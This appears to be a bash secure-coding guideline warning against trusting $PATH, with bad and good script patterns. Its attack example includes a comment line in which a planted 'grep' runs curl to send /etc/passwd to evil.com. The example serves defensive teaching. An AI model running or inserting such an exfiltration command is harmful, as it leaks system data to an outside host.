# sec-path-injection

> Never trust `$PATH`; use absolute paths or set PATH explicitly

## Why It Matters

`PATH` determines which executable runs when you type a command name. An attacker who can modify `PATH` (or the environment of your script) can replace `ls`, `grep`, or `sudo` with malicious versions. Always use absolute paths for security-sensitive operations, or set a known-safe `PATH` at the start of your script.

## Bad

```bash
#!/usr/bin/env bash

# Relies on PATH — attacker could substitute these binaries
sudo apt update           # Which sudo? Which apt?
tar -czf backup.tar.gz /data   # Which tar?

# Inheriting caller's PATH — unpredictable
chmod 600 "$config_file"    # Which chmod?

# Running relative paths
./my_helper_tool            # Depends on CWD being expected
```

## Good

```bash
#!/usr/bin/env bash

# Set explicit, safe PATH
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
export PATH

# Or use absolute paths for privileged operations
/usr/bin/sudo /usr/bin/apt update
/usr/bin/tar -czf backup.tar.gz /data

# Check commands exist before using
require_cmd() {
    if ! command -v "$1" &>/dev/null; then
        echo "ERROR: Required command not found: $1" >&2
        exit 1
    fi
}

require_cmd "git"
require_cmd "docker"

# For script-internal tools, use script location
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
"${SCRIPT_DIR}/helper_tool" --process
```

## PATH Attack Example

```bash
# Attacker's environment:
# PATH=/tmp/evil:$PATH
# /tmp/evil/grep contains: curl http://evil.com/?data=$(cat /etc/passwd)

# Your script:
log_errors() {
    grep "ERROR" /var/log/app.log   # Runs /tmp/evil/grep!
}
```

## See Also

- [sec-no-exec-user-test](./sec-no-exec-user-test.md) - Command name attacks
- [err-command-exists](./err-command-exists.md) - Checking command availability
